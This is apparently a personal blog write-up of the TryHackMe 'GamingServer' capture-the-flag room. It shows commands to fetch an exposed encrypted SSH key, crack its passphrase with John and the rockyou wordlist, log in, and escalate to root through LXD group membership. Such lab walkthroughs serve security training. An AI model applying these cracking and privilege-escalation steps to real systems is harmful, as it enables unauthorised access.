---
title: GamingServer
description: 'Finding an encrypyed SSH key and dictionary and escalating through LXC'
pubDate: 2024-01-04
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/80d16a6756c805903806f7ecbdd80f6d.jpeg'
---

With Feroxbuster we find a secretKey, which is an encrypted SSH key.
We can crack it with John:

```bash
wget http://10.10.159.169/secret/secretKey
ssh2john secretKey > ssh_hash
john ssh_hash --wordlist /usr/share/wordlists/rockyou.txt
...snip...
letmein          (secretKey)
```

We also find `http://10.10.159.169/uploads/` which has a dict with the password in it too.

In the HTML source of the index page there is a comment mentioning 'john'.

```bash
ssh -i secretKey john@10.10.159.169 # <- letmein
```

We have LXC installed / configured and are member of that group.

Following this: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2

image name: myimage
storage pool: mycontainer

```bash
cd /mnt/root/root
cat root.txt
```
